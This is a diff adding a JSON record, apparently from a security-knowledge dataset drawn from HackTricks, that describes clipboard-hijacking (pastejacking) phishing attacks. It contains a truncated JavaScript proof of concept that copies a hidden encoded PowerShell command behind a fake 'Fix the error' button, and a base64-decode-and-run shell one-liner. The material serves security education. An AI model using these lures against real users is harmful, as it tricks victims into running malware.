@@ -1,0 +1,27 @@
+{
+  "id": "generic_methodologies_and_resources_2b9569534157",
+  "category": "generic-methodologies-and-resources",
+  "title": "clipboard hijacking",
+  "description": "# Clipboard Hijacking (Pastejacking) Attacks\n\n{{#include ../../banners/hacktricks-training.md}}\n\n> \"Never paste anything you did not copy yourself.\" \u2013 old but still valid advice\n\n## Overview\n\nClipboard hijacking \u2013 also known as *pastejacking* \u2013 abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled text into the system clip",
+  "payloads": [
+    "# Clipboard Hijacking (Pastejacking) Attacks",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "> \"Never paste anything you did not copy yourself.\" \u2013 old but still valid advice",
+    "## Overview",
+    "Clipboard hijacking \u2013 also known as *pastejacking* \u2013 abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled text into the system clipboard. Victims are encouraged, normally by carefully crafted social-engineering instructions, to press **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), or open a terminal and *paste* the clipboard content, immediately executing arbitrary commands.",
+    "Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.",
+    "## Forced copy buttons and hidden payloads (macOS one-liners)",
+    "Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a \u201cCopy\u201d button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.",
+    "## JavaScript Proof-of-Concept",
+    "```html",
+    "<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->",
+    "<button id=\"fix\" onclick=\"copyPayload()\">Fix the error</button>",
+    "<script>",
+    "function copyPayload() {",
+    "const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md"
+  ]
+}
